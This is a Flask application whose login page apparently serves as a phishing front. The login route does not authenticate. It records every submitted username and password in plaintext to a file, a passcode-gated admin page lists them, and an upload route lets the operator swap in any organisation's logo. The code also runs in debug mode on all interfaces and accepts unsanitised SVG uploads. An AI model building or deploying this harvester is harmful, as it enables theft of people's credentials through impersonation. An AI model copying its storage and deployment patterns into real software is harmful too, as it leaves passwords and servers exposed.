import os
from datetime import datetime
from pathlib import Path

from flask import Flask, render_template, request

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 5 * 1024 * 1024  # 5 MB upload cap

BASE_DIR = Path(__file__).resolve().parent
STATIC_DIR = BASE_DIR / "static"
LOG_FILE = BASE_DIR.parent / "logins.txt"

ALLOWED_LOGO_EXTS = {".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg"}


def _read_logins():
    if not LOG_FILE.exists():
        return []
    with LOG_FILE.open("r", encoding="utf-8") as f:
        return [line.rstrip("\n") for line in f if line.strip()]


def _current_logo_filename():
    if not STATIC_DIR.exists():
        return None
    for ext in ALLOWED_LOGO_EXTS:
        candidate = STATIC_DIR / f"logo{ext}"
        if candidate.exists():
            return candidate.name
    return None


@app.route("/", methods=["GET", "POST"])
def login():
    username = None
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        if not username or not password:
            username = None
        else:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with LOG_FILE.open("a", encoding="utf-8") as f:
                f.write(f"{timestamp} | username={username} | password={password}\n")
    return render_template(
        "login.html",
        username=username,
        logo_filename=_current_logo_filename(),
    )


@app.route("/admin", methods=["GET", "POST"])
def admin():
    expected = os.environ.get("ADMIN_PASSCODE", "")
    entries = None
    error = None

    if request.method == "POST":
        provided = request.form.get("passcode") or ""
        if expected and provided == expected:
            entries = _read_logins()
        else:
            error = "Incorrect passcode."

    return render_template("admin.html", entries=entries, error=error)


@app.route("/upload-logo", methods=["GET", "POST"])
def upload_logo():
    expected = os.environ.get("ADMIN_PASSCODE", "")
    error = None
    success = False

    if request.method == "POST":
        provided = request.form.get("passcode") or ""
        file = request.files.get("logo")

        if not expected or provided != expected:
            error = "Incorrect passcode."
        elif not file or not file.filename:
            error = "Please choose an image to upload."
        else:
            ext = Path(file.filename).suffix.lower()
            if ext not in ALLOWED_LOGO_EXTS:
                allowed = ", ".join(sorted(e.lstrip(".") for e in ALLOWED_LOGO_EXTS))
                error = f"Unsupported file type. Allowed: {allowed}."
            else:
                STATIC_DIR.mkdir(parents=True, exist_ok=True)
                for e in ALLOWED_LOGO_EXTS:
                    old = STATIC_DIR / f"logo{e}"
                    if old.exists():
                        old.unlink()
                file.save(STATIC_DIR / f"logo{ext}")
                success = True

    return render_template(
        "upload_logo.html",
        error=error,
        success=success,
        logo_filename=_current_logo_filename(),
    )


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "5000"))
    app.run(host="0.0.0.0", port=port, debug=True)
